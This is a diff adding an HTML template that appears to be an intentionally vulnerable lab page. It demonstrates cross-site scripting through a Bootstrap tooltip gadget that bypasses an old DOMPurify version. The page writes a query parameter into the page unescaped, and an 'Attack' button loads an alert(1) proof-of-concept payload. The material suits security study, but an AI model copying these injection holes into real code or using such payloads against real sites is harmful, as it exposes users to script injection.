@@ -1,0 +1,47 @@
+<html>
+    <head>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css"></link>
+        <script src="{{ url_for('static', filename='jquery.min.js') }}"></script>
+        <script src="{{ url_for('static', filename='bootstrap.js') }}"></script>
+        <script src="{{ url_for('static', filename='DOMPurify-0.8.7/src/purify.js') }}"></script>
+    </head>
+    
+    <body>
+        <p>Bootstrap</p>
+        
+        <script>
+            function getParam(name) {
+                var params = location.search.slice(1).split("&");
+                for (var i in params) {
+                var param = params[i];
+                var equalIndex = param.indexOf("=");
+                var paramName = param.substring(0, equalIndex);
+                var paramValue = param.substring(equalIndex + 1);
+                if (paramName == name) {
+                    return unescape(paramValue);
+                }
+                }
+                return undefined;
+            }
+            </script>
+        <script>
+            document.write(DOMPurify.sanitize(getParam("inj")));
+        </script>
+
+        {{inj|safe}}
+
+        <script>
+        $("[data-toggle=tooltip]").tooltip();
+        </script>
+
+        <button onclick="attack()">Attack</button>
+
+        <script>
+            let url = window.location.href;
+            const attack = () => {
+            window.location.replace(url+"?inj=%3Cdiv%20data-toggle=tooltip%20data-html=true%20title=%27%3Cscript%3Ealert(1)%3C/script%3E%27%3Ehover for xss%3C/div%3E");
+            }
+        </script>
+    </body>
+</html>
+
